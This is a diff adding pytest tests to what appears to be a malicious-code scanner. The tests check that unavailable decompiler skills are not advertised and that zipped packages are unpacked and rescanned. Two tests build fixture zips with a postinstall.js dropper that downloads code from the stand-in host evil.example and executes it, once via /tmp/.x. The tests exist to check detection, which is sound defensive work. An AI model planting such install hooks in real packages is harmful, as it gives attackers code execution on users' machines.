@@ -198,3 +198,98 @@ def test_emit_atoms_provider_folds_into_findings(tmp_path, monkeypatch):
     atoms = {a.get("reason") for a in report["transforms"]["droppedAtoms"]}
     assert "unknown-family" in atoms  # BOGUS.NOPE rejected
     assert "payload.so" in report["transforms"]["transformed"]
+
+
+# --- the real skill provider (unmask-re) ----------------------------------
+# These exercise the actual vendored skills through the transform seam. They need
+# the unmask-re package importable (it is in the workspace) and the skill's
+# prerequisites on PATH. Skills whose prereqs are missing are skipped — the whole
+# point of prereq-gating is that a missing tool is an honest blind spot, not a
+# test failure.
+
+def _has_unmask_re() -> bool:
+    try:
+        import unmask_re  # noqa: F401
+        return True
+    except ImportError:
+        return False
+
+
+def test_skill_provider_advertises_only_prereq_satisfied_capabilities():
+    """A skill whose external tool is missing must NOT advertise its capability —
+    that is the honest-blind-spot contract. With no jadx/ilspycmd on a typical CI
+    host, decompile-jvm/decompile-dotnet are absent while pure-stdlib skills are
+    present."""
+    if not _has_unmask_re():
+        import pytest
+        pytest.skip("unmask-re not importable")
+    from unmask_re.provider import SkillTransformProvider, _resolved_skills
+    p = SkillTransformProvider()
+    # Pure-stdlib skills are always available (python3 is the runner's only prereq).
+    assert "unpack-archive" in p.capabilities
+    assert "scan-secrets" in p.capabilities
+    # JVM/.NET decompilers are BYO-tool: they only advertise when jadx/ilspycmd
+    # resolve. On a clean host they must be absent (the honest blind spot).
+    jvm = [s for s in _resolved_skills() if s.id == "jvm-decompile"][0]
+    if jvm.missing_prereqs:
+        assert "decompile-jvm" not in p.capabilities
+
+
+def test_skill_provider_unpacks_a_real_archive(tmp_path):
+    """The real `unpack` skill opens a zip core can't read, and the rescanned
+    contents become MCD findings. End-to-end proof the skill seam is wired."""
+    if not _has_unmask_re():
+        import pytest
+        pytest.skip("unmask-re not importable")
+    import zipfile
+    from unmask_re.provider import SkillTransformProvider
+    from unmask.transform.contract import ArtifactRef
+    # A zip with a payload that will produce findings once revealed.
+    zip_path = tmp_path / "pkg.zip"
+    with zipfile.ZipFile(zip_path, "w") as z:
+        z.writestr("postinstall.js",
+                   'const https=require("https");const cp=require("child_process");\n'
+                   'https.get("https://evil.example/c2",(r)=>{let b="";'
+                   'r.on("data",c=>b+=c);r.on("end",()=>cp.execSync(b));});\n')
+    p = SkillTransformProvider()
+    art = ArtifactRef(path=str(zip_path), logical_path="pkg.zip", kind="archive")
+    assert p.can_handle(art), "unpack skill should handle an archive"
+    import os
+    workdir = str(tmp_path / "work")
+    res = p.transform(art, workdir)
+    assert not res.error, f"unpack failed: {res.error}"
+    assert res.derived, "unpack produced no recovered source roots"
+    # The revealed postinstall.js must exist under one of the derived roots.
+    revealed = []
+    for d in res.derived:
+        for root, _, files in os.walk(d.root):
+            revealed += [os.path.join(root, f) for f in files]
+    assert any("postinstall.js" in r for r in revealed), \
+        f"postinstall.js not revealed by unpack; got {revealed}"
+
+
+def test_unpack_skill_drives_scan_to_findings(tmp_path):
+    """Full pipeline: a zip that core can't read scans clean, but with unmask-re's
+    unpack skill the contents are revealed and the hidden dropper surfaces."""
+    if not _has_unmask_re():
+        import pytest
+        pytest.skip("unmask-re not importable")
+    import zipfile
+    from unmask import MCDConfig, run_mcd
+    tgt = tmp_path / "tgt"
+    tgt.mkdir()
+    with zipfile.ZipFile(tgt / "bundle.zip", "w") as z:
+        z.writestr("postinstall.js",
+                   'const https=require("https");const fs=require("fs");'
+                   'const cp=require("child_process");\n'
+                   'https.get("https://evil.example/payload",(r)=>{let b="";'
+                   'r.on("data",c=>b+=c);r.on("end",()=>{'
+                   'fs.writeFileSync("/tmp/.x",b);cp.execSync("/tmp/.x");});});\n')
+    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
+    report = json.loads(Path(result.report_paths["json"]).read_text())
+    # The revealed dropper should drive at least a review (fetch+exec), and the
+    # transform section should record the unpack.
+    assert report.get("transforms"), "no transform ran on the archive"
+    assert "bundle.zip" in report["transforms"]["transformed"] or \
+           any("bundle.zip" in t for t in report["transforms"]["transformed"])
+    assert report["summary"]["findingCount"] >= 1
